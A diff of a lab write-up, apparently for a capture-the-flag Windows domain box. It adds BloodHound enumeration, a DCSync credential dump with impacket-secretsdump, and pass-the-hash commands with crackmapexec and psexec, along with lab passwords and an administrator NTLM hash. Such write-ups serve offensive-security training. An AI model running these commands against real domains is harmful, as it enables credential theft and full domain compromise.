@@ -221,11 +221,52 @@ fsmith:Thestrokes23
 ▶ BloodHound --no-sandbox
 ```
 
-  - Upload `SharpHound.exe`
-  - Execute
+  - Upload `SharpHound.exe`.
+  - Launch `SharpHound.exe`.
 ```CSS
 ▶ upload `SharpHound.exe`
 ```
 ![image](https://user-images.githubusercontent.com/83878909/232280398-222104de-1d6d-484d-b553-867bc5b2760f.png)
 ![image](https://user-images.githubusercontent.com/83878909/232280509-77195659-fdce-4f82-8042-321bb62cbf67.png)
+
+  - Download data
+```CSS
+*Evil-WinRM* PS C:\Users\FSmith\Documents> download 20230416073219_BloodHound.zip
+```
+![image](https://user-images.githubusercontent.com/83878909/232280690-87cf71b4-1bbc-4769-b4a3-e69b4919f89e.png)
+![image](https://user-images.githubusercontent.com/83878909/232280791-cb102718-89f9-45e7-8ad6-675a4d8c3e0f.png)
+
+  - Upload `zip` to `BloodHound`.
+![image](https://user-images.githubusercontent.com/83878909/232280907-575a4fc0-c07f-48ff-b97a-d32349bcca26.png)
+
+  - Mark owned users `FSMITH@EGOTISTICAL-BANK.LOCAL` and `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`.
+![image](https://user-images.githubusercontent.com/83878909/232281206-b02d1834-b91b-4b64-8c11-361c8a6e550b.png)
+
+  - Find Pricipals with DCSync Rights
+![image](https://user-images.githubusercontent.com/83878909/232283846-88144e0c-870b-4cc0-826f-a0838112bfae.png)
+![image](https://user-images.githubusercontent.com/83878909/232283882-1c6dd475-a1b7-4fa3-bdbb-22e313bd6b0b.png)
+![image](https://user-images.githubusercontent.com/83878909/232283908-3657106f-226c-44b4-8dd4-92d4def04dbb.png)
+
+---
+
+## DCSync Attack - Impacket
+```CSS
+▶ impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.10.10.175 
+```
+  - Password: Found earlier `Moneymakestheworldgoround!`.
+![image](https://user-images.githubusercontent.com/83878909/232284247-391e9a65-ebcc-407c-a59a-e56a44871185.png)
+
+---
+
+## Pass the Hash Attack
+```CSS
+▶ crackmapexec smb 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+```
+![image](https://user-images.githubusercontent.com/83878909/232284757-aa2a4478-5692-4aba-ae30-d57fc67e5336.png)
+
+  - User the NTLM hash twice instead of using "LANMAN:NTLM".
+```CSS
+▶ impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e
+```
+![image](https://user-images.githubusercontent.com/83878909/232285865-769bbc96-0b3d-41f3-8426-eeb010a363ed.png)
 
